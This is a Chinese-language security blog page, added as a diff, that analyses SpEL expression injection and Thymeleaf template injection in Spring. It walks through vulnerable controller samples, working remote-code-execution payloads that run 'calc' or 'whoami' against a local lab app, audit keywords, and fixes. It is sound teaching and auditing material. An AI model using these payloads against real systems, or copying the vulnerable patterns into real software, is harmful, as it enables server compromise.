@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Spel表达式注入&相关组件的Spel表达式注入分析 - ConsT27's Blog</title>
+    <link href="../../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Spel\u8868\u8fbe\u5f0f\u6ce8\u5165\u0026amp;\u76f8\u5173\u7ec4\u4ef6\u7684Spel\u8868\u8fbe\u5f0f\u6ce8\u5165\u5206\u6790", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "Spel\u8868\u8fbe\u5f0f\u6ce8\u5165", url: "#spel" },
+              {title: "Thymeleadf \u6a21\u677f\u6ce8\u5165\uff08\u57fa\u4e8eSpel\u8868\u8fbe\u5f0f\u6ce8\u5165\uff09", url: "#thymeleadf-spel" },
+              {title: "Thymeleaf\u8fd0\u884c\u903b\u8f91", url: "#thymeleaf" },
+              {title: "\u9632\u5fa1", url: "#_7" },
+              {title: "Thymeleaf \u6a21\u677f\u6ce8\u5165", url: "#thymeleaf_1" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        ognl 注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        表达式注入
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="spelspel">Spel表达式注入&amp;相关组件的Spel表达式注入分析</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#Spel表达式注入">Spel表达式注入</a><ul>
+<li><a href="#环境搭建">环境搭建</a></li>
+<li><a href="#漏洞原理">漏洞原理</a></li>
+<li><a href="#审计关键字">审计关键字</a></li>
+<li><a href="#修复">修复</a></li>
+</ul>
+</li>
+<li><a href="#Thymeleadf-模板注入基于Spel表达式注入">Thymeleadf 模板注入（基于Spel表达式注入）</a><ul>
+<li><a href="#简介">简介</a></li>
+</ul>
+</li>
+<li><a href="#Thymeleaf运行逻辑">Thymeleaf运行逻辑</a><ul>
+<li><a href="#redirect">redirect:</a></li>
+<li><a href="#HttpServletResponse-">HttpServletResponse </a></li>
+</ul>
+</li>
+<li><a href="#防御">防御</a><ul>
+<li><a href="#ResponseBody-RestController">ResponseBody RestController</a></li>
+</ul>
+</li>
+<li><a href="#Thymeleaf-模板注入">Thymeleaf 模板注入</a></li>
+</ul>
+<h2 id="spel">Spel表达式注入</h2>
+<p>Spel表达式是spring下的一种表达式语言，若目标程序Spel表达式可控且能被解析，则可能会导致RCE等安全问题。</p>
+<h3 id="_2">环境搭建</h3>
+<p>起一个项目，然后导入maven即可</p>
+<pre><code class="language-java">&lt;properties&gt;
+    &lt;org.springframework.version&gt;5.0.8.RELEASE&lt;/org.springframework.version&gt;
+&lt;/properties&gt;
+&lt;dependency&gt;
+      &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+      &lt;artifactId&gt;spring-expression&lt;/artifactId&gt;
+      &lt;version&gt;${org.springframework.version}&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h3 id="_3">漏洞原理</h3>
+<p>我们来看一段有漏洞的代码，假设expression2 变量用户可控</p>
+<pre><code class="language-java">ExpressionParser parser = new SpelExpressionParser();
+String expression2 = &quot;T(java.lang.Runtime).getRuntime().exec('calc')&quot;; //假设expression2 变量用户可控，这个变量的内容便是spel表达式
+//也可以用new关键字 String expression2 = &quot;new ProcessBuilder('calc').start()&quot;;
+Expression result2 = parser.parseExpression(expression2);
+result2.getValue();
+</code></pre>
+<p>用户传入恶意spel表达式后，在第三行parseExpression方法被解析，第四行在getValue方法被执行spel表达式内容，完成RCE</p>
+<p>用户传入的Spel表达式中， T(java.lang.Runtime)用于实例化某个类，实例化后我们可以调用其内部方法。也可以用new关键字，就像注释中的一行</p>
+<p>有些时候会对spel进行鉴别，即满足一定条件的字符串才会被认为是表达式，比如这样</p>
+<pre><code class="language-java">ExpressionParser parser = new SpelExpressionParser();
+ParserContext parserContext = new ParserContext() {
+    @Override
+    public boolean isTemplate() {
+    return true;
+    }
+    @Override
+    public String getExpressionPrefix() {
+    return &quot;#{&quot;;
+    }
+    @Override
+    public String getExpressionSuffix() {
+    return &quot;}&quot;;
+    }
+};
+String template = &quot;#{'hello '}#{'freebuf!'}&quot;;
+Expression expression = parser.parseExpression(template, parserContext);
+System.out.println(expression.getValue());
+</code></pre>
+<p>通过getExpressionPrefix和getExpressionPrefix方法，确定在 #{..} 中的字符串才为SPEL表达式</p>
+<h3 id="_4">审计关键字</h3>
+<p>org.springframework.expression.spel.standard</p>
+<p>getValue()</p>
+<p>parseExpression()</p>
+<h3 id="_5">修复</h3>
+<p>SimpleEvaluationContext 和StandardEvaluationContext </p>
+<p>StandardEvaluationContext  是默认的上下文环境，对spel解析不设限制</p>
+<p>SimpleEvaluationContext  是受限的上下文环境，不允许spel执行构造方法，java类型引用，bean类型引用</p>
+<p>修复后代码</p>
+<pre><code class="language-java">ExpressionParser parser = new SpelExpressionParser();
+String expression2 = &quot;new ProcessBuilder('calc').start()&quot;;
+Expression result2 = parser.parseExpression(expression2);
+EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
+result2.getValue(context);
+</code></pre>
+<p>运行结果</p>
+<p><img alt="" src="../image/image_pWl_wdFFs5.png" /></p>
+<p>ref:<a href="https://www.freebuf.com/articles/network/250026.html" title="https://www.freebuf.com/articles/network/250026.html">https://www.freebuf.com/articles/network/250026.html</a></p>
+<p>使用如下项目搭建环境，idea打开其pom.xml即可</p>
+<p><a href="https://github.com/veracode-research/spring-view-manipulation/" title="https://github.com/veracode-research/spring-view-manipulation/">https://github.com/veracode-research/spring-view-manipulation/</a></p>
+<h2 id="thymeleadf-spel">Thymeleadf 模板注入（基于Spel表达式注入）</h2>
+<h3 id="_6">简介</h3>
+<p>Thymeleaf是一个服务端模板引擎，spring官方支持该引擎。</p>
+<h2 id="thymeleaf">Thymeleaf运行逻辑</h2>
+<p>来到项目中的HelloControleer 第16行</p>
+<pre><code class="language-java">@GetMapping(&quot;/&quot;)
+public String index(Model model) {
+    model.addAttribute(&quot;message&quot;, &quot;happy birthday&quot;);
+    return &quot;welcome&quot;;
+}
+</code></pre>
+<p>这里代码逻辑是spring的，接收所有url为 / 的请求到此控制器进行处理。</p>
+<p>然后向model添加键值对，model中的数据会随着要返回的视图一起返回给前端，此处键为message，值为happy birthday</p>
+<p>然后return一行返回了 /templates/welcome.html 这个视图 （相当于给welcome添加前缀templates/ ，后缀.html)</p>
+<p>我们来看看welcome.html</p>
+<pre><code class="language-java">&lt;!DOCTYPE HTML&gt;
+&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;
+&lt;div th:fragment=&quot;header&quot;&gt;
+    &lt;h3&gt;Spring Boot Web Thymeleaf Example&lt;/h3&gt;
+&lt;/div&gt;
+&lt;div th:fragment=&quot;main&quot;&gt;
+    &lt;span th:text=&quot;'Hello, ' + ${message}&quot;&gt;&lt;/span&gt;
+&lt;/div&gt;
+&lt;/html&gt;
+</code></pre>
+<p>我们看倒数第三行th:text 内部有 ${message} ,${...}里面就是SPEL表达式或者ognl表达式</p>
+<p>另外，如果返回模板时return的内容中含有 <code>::</code>，则该字符串会被当作表达式处理</p>
+<p>同时在表达式中还有 <strong>\${..}</strong> 这种预处理表达式，在其中的内容会更优先处理一次（预处理）</p>
+<p>就像这种代码</p>
+<pre><code class="language-java">@GetMapping(&quot;/path&quot;)
+    public String path(@RequestParam String lang) {
+        return &quot;user/&quot; + lang + &quot;/welcome&quot;; //template path is tainted
+    }
+</code></pre>
+<p>注意这里的payload我并没有用到预处理表达式，因为section中参数本来就是selector的内容，本来就会被解析，没必要再套一层预处理。</p>
+<p>注意这里的payload也要加上\${..}</p>
+<p><img alt="" src="../image/image_tsrmGl-6FE.png" /></p>
+<p>那么这串代码呢？</p>
+<pre><code class="language-java">@GetMapping(&quot;/doc/{document}&quot;)
+public void getDocument(@PathVariable String document) {
+    log.info(&quot;Retrieving &quot; + document);
+    //returns void, so view name is taken from URI
+}
+</code></pre>
+<p>和上面的思路一样，但是payload需要微微调整一下</p>
+<pre><code class="language-java">http://127.0.0.1:8090/doc/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()}__::.x
+</code></pre>
+<p>至于为什么templatename必须被__${}<strong>包围，是因为实际上的templatename为/doc/xxxxxx 我们可控的是第二层路由，为了保证第二层路由里的表达式能够顺利被执行而不受前面的 /doc/ 干扰命令，所以用</strong>${}__预处理一下</p>
+<p>至于为什么selecor前面要有一个<code>.</code>原因是这样的</p>
+<p>模板名获取实际上是通过这个函数拿到的</p>
+<p><img alt="" src="../image/image_caBWjh6NJ3.png" /></p>
+<p>它会对url获得的模板名进行修正，比如增加前缀后缀（默认为空），以及调用方法transformPath处理</p>
+<p>我们跟进此方法并注意断点打到的地方</p>
+<p><img alt="" src="../image/image_ZLlkIuzJhY.png" /></p>
+<p>this.stripExtension在这种情况默认为true，也就是说会调用StringUtils.stripFilenameExtension来处理我们的模板名</p>
+<p>StringUtils.stripFilenameExtension 会搜索字符串中最后一个<code>.</code>符号的索引位置，并截取<code>.</code>之前的内容返回。</p>
+<p>所以如果我们的payload selector不加 <code>.</code> 那么截取后的表达式会变成这样，没有了<code>::</code> ，无法正确被当作表达式解析</p>
+<p><img alt="" src="../image/image_Im0zb1llGS.png" /></p>
+<p>但如果加了 <code>.</code>,那么被截取后表达式会变成这样，<code>::</code> 还在，能被当作表达式解析</p>
+<p><img alt="" src="../image/image_33LcE0SIPQ.png" /></p>
+<p>弄懂原理后就会发现这样构造payload也可以</p>
+<pre><code class="language-java">http://127.0.0.1:8090/doc/::__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()}__.a
+</code></pre>
+<p>只要配置上ResponseBody或RestController，那么就不会进行视图解析相关内容，而是直接返回</p>
+<p><img alt="" src="../image/image_MNGrtWE1Wf.png" /></p>
+<h4 id="redirect">redirect:</h4>
+<pre><code class="language-java">@GetMapping(&quot;/safe/redirect&quot;)
+public String redirect(@RequestParam String url) {
+    return &quot;redirect:&quot; + url; //FP as redirects are not resolved as expressions
+}
+
+</code></pre>
+<p>在返回值前加字符串redirect: ，表示该视图的解析不再由 Spring ThymeleafView来进行解析，而是由 RedirectView 来进行解析</p>
+<h4 id="httpservletresponse">HttpServletResponse&#x20;</h4>
+<pre><code class="language-java">@GetMapping(&quot;/safe/doc/{document}&quot;)
+public void getDocument(@PathVariable String document, HttpServletResponse response) {
+    log.info(&quot;Retrieving &quot; + document); //FP
+}
+</code></pre>
+<p>只需要在参数里加上 HttpServletResponse response，spring就不会再对视图进行解析。
+只对这种直接从url获取模板名的控制器有效</p>
+<p><img alt="" src="../image/image_WMOHp5vWJ1.png" /></p>
+<h2 id="_7">防御</h2>
+<p>这个项目也提供了三个控制器的修复版</p>
+<h3 id="responsebody-restcontroller">ResponseBody RestController</h3>
+<pre><code class="language-java">@GetMapping(&quot;/safe/fragment&quot;)
+@ResponseBody
+public String safeFragment(@RequestParam String section) {
+    return &quot;welcome :: &quot; + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
+}
+</code></pre>
+<p>注意templatename必须被 <strong>\${}</strong> 包围，selector第一个字符必须为<code>.</code></p>
+<p>如果我们lang赋值为 <strong>\${4*4}</strong>::123，可以发现预处理表达式里的内容被解析了，并以报错的形式返回（注意paylaod需要urlencode）</p>
+<p><img alt="" src="../image/image_XOLPLOey3t.png" /></p>
+<p>那么这个<code>::</code> 到底意味着什么呢，我们上面的payload后面为什么还要跟着一串字符呢？</p>
+<p><code>::</code>是片段选择器的分隔符，分割templatename和selector，即templatename::selector，templatename和selector都会被当作表达式的部分解析一起解析，即实际上解析的内容是 \~{templatename::selector}</p>
+<p>比如在下面的代码中，welcome是templatename，我们可以选择/templates/welcome.html 的selector来指定页面显示何种内容</p>
+<pre><code class="language-java">@GetMapping(&quot;/fragment&quot;)
+public String fragment(@RequestParam String section) {
+    return &quot;welcome :: &quot; + section; //fragment is tainted
+}
+</code></pre>
+<pre><code class="language-java">&lt;!DOCTYPE HTML&gt;
+&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;
+&lt;div th:fragment=&quot;header&quot;&gt;  //如果selector 是header，那么只显示该div中的内容
+    &lt;h3&gt;Spring Boot Web Thymeleaf Example&lt;/h3&gt;
+&lt;/div&gt;
+&lt;div th:fragment=&quot;main&quot;&gt;  ////如果selector 是main，那么只显示该div中的内容
+    &lt;span th:text=&quot;'Hello, ' + ${message}&quot;&gt;&lt;/span&gt;
+&lt;/div&gt;
+&lt;/html&gt;
+
+</code></pre>
+<p><img alt="" src="../image/image_xQQOCisACf.png" /></p>
+<p>还有下图这种神奇代码</p>
+<pre><code class="language-java">@GetMapping(&quot;/doc/{document}&quot;)
+public void getDocument(@PathVariable String document) {
+    log.info(&quot;Retrieving &quot; + document);
+    //returns void, so view name is taken from URI
+}
+</code></pre>
+<p>代码并没有返回视图，但是注意路由中的{document}，这里会直接把/doc/{document}用作视图名返回</p>
+<p><img alt="" src="../image/image_jA9JGQDXGo.png" /></p>
+<h2 id="thymeleaf_1">Thymeleaf 模板注入</h2>
+<p>如果我们可以控制表达式的内容，那么就可以实现Spel表达式注入了</p>
+<p>根据上一小节的知识，我们可以很轻松的构造下面这串代码的payload，通过报错把命令执行结果带出来</p>
+<pre><code class="language-java">@GetMapping(&quot;/path&quot;)
+public String path(@RequestParam String lang) {
+    return &quot;user/&quot; + lang + &quot;/welcome&quot;; //template path is tainted
+}
+payload:__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;).getInputStream()).next()}__::
+
+</code></pre>
+<p><img alt="" src="../image/image_tsCSH8sg0o.png" /></p>
+<p>那么这串代码呢？我们只有selector可控</p>
+<pre><code class="language-java">@GetMapping(&quot;/fragment&quot;)
+public String fragment(@RequestParam String section) {
+    return &quot;welcome :: &quot; + section; //fragment is tainted
+}
+</code></pre>
+<p>实战中可以发现是无法直接得到回显的（因为不报错），但是命令依旧会被解析执行，我们可以通过dns外带等方式带出结果</p>
+<p>会发现第三行和倒数第三行都用到了th: 这个前缀，这个前缀就是使用Thymeleaf的标志，用于调用Thymeleaf内部的方法。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        ognl 注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        表达式注入
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
